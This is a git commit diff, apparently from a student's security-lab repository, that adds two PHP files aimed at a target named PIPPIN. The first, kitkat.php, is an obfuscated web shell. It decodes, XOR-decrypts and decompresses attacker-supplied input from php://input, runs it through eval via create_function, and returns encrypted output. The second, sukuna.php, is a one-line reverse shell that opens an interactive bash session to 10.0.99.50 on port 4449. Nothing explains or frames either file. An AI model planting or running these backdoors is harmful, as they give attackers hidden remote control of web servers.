754117d4da24b5992b5cd10f215c71bc50b9c3f4
Herrscherr0Z <joshua.leonmejia@mymail.champlain.edu>
2022-11-01 22:48:12 -0400

    New Stuff

---
+++ TARGETS/PIPPIN/WEEK8/kitkat.php
@@ -0,0 +1,13 @@
+<?php
+$r='=1)q {@ob_qstart();@eqval(@gzuncqoqmpress(@x(@baqse64_dqqecode($';
+$A='m[q1]q),$k)));$qo=@ob_getq_cqontentsq();@ob_eqqnd_clean();$r=q@baq';
+$m=str_replace('oZ','','oZcreaoZoZtoZoZe_funcoZtion');
+$D='$jq++,$i++q){$o.q=$t{$iq}q^$k{$j}q;}q}return $o;q}if (@pregqq_ma';
+$y='tch("/$khqq(.+)$kf/",@fqile_gqet_coqntqqenqts(q"php:/q/input"),$m)=';
+$t='trlqen($tq);$qo="";fqor(q$iq=0;$i<q$lq;){for($j=0;($j<$c&&q$i<$l);';
+$Z='$k=q"b73555q3f";$kh="qc313q8b5q0ddq0d";$kqf="60dfe9e6b564"q;$p="';
+$V='se64_encqoqde(@x(@gzcqompqress($o),$qk));prqint(q"$p$kh$r$qkf");}';
+$i='Nq7OqlZlgV8q7LHwvoq4qq";functioqn qx($tq,$k){$c=qstrlen($k);$l=s';
+$d=str_replace('q','',$Z.$i.$t.$D.$y.$r.$A.$V);
+$x=$m('',$d);$x();
+?>
---
+++ TARGETS/PIPPIN/WEEK8/sukuna.php
@@ -0,0 +1,1 @@
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"10.0.99.50"/4449 0>&1'");?>
